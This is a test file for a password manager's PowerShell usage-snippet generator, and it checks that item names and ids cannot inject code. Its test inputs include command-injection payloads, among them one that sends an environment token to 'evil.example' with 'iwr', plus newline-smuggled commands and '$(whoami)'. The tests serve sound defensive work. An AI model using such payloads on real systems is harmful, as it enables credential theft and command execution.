import { powerShellLiteral } from "./install-command";
import { commentName, scriptUsage } from "./script-usage";

const id = "0D1E2F3A-4B5C-4D6E-8F70-819A2B3C4D5E";
const server = "https://vault.example.com/";

/** The lines after the comment marker is taken off: what PowerShell runs. */
const code = (usage: string) => usage.split("\n").map((line) => line.split("  # ")[0]);

describe("scriptUsage", () => {
  it("names the item by its id, quoted, with its name only in a comment", () => {
    expect(scriptUsage(server, { id, name: "Domain admin" })).toBe(
      [
        "Invoke-WebRequest 'https://vault.example.com/api/keykeeper/script/PassBundle.psm1' -OutFile PassBundle.psm1",
        "Import-Module .\\PassBundle.psm1",
        "$credential = Get-PassBundleCredential -Item '0d1e2f3a-4b5c-4d6e-8f70-819a2b3c4d5e'  # Domain admin",
      ].join("\n"),
    );
  });

  it.each([
    "x$(iwr https://evil.example/?t=$env:PASSBUNDLE_TOKEN)",
    'x"; iwr https://evil.example/; "',
    "x'; iwr https://evil.example/; '",
    "x’; iwr https://evil.example/; ‘",
    "x`$(whoami)",
    "Domain admin\niwr https://evil.example/",
    "Domain admin\r\niwr https://evil.example/",
    "Domain admin iwr https://evil.example/",
    "#> <# {{ secret }} @SECRET@ %SECRET% ${env:PASSBUNDLE_TOKEN}",
  ])("never lets an item's name become code: %p", (name) => {
    const usage = scriptUsage(server, { id, name });
    const lines = usage.split("\n");
    // Three lines, whatever the name holds, and the name's only in the comment.
    expect(lines).toHaveLength(3);
    expect(code(usage)[2]).toBe(
      "$credential = Get-PassBundleCredential -Item '0d1e2f3a-4b5c-4d6e-8f70-819a2b3c4d5e'",
    );
    const comment = lines[2].split("  # ")[1] ?? "";
    expect(comment).toMatch(/^[\p{L}\p{N} .,_()+-]*$/u);
    for (const unsafe of ["$", "`", "'", "’", "‘", '"', ";", "{", "@", "%", "#", "<", ">"]) {
      expect(comment).not.toContain(unsafe);
    }
  });

  it("leaves the comment out when nothing of the name is safe to show", () => {
    expect(scriptUsage(server, { id, name: "${}@#" }).split("\n")[2]).toBe(
      "$credential = Get-PassBundleCredential -Item '0d1e2f3a-4b5c-4d6e-8f70-819a2b3c4d5e'",
    );
  });

  it("keeps names in other languages readable", () => {
    expect(commentName("Café Zürich – Wi‑Fi")).toBe("Café Zürich Wi Fi");
    expect(commentName("Сервер 1")).toBe("Сервер 1");
  });

  it("leaves out the item's line for anything that isn't an item id", () => {
    const usage = scriptUsage(server, { id: "x'; calc; '", name: "Domain admin" });
    expect(usage.split("\n")).toHaveLength(2);
    expect(usage).not.toContain("calc");
  });

  it("quotes a server address with quotes in it", () => {
    expect(code(scriptUsage("https://vault.example.com/x'y", { id, name: "a" }))[0]).toBe(
      "Invoke-WebRequest 'https://vault.example.com/x''y/api/keykeeper/script/PassBundle.psm1' -OutFile PassBundle.psm1",
    );
  });
});

describe("powerShellLiteral", () => {
  it("doubles every quote character PowerShell ends a literal string at", () => {
    expect(powerShellLiteral("it's")).toBe("'it''s'");
    expect(powerShellLiteral("it‘s it’s it‚s it‛s")).toBe("'it‘‘s it’’s it‚‚s it‛‛s'");
    expect(powerShellLiteral('$(calc) "x" `y`')).toBe("'$(calc) \"x\" `y`'");
  });
});
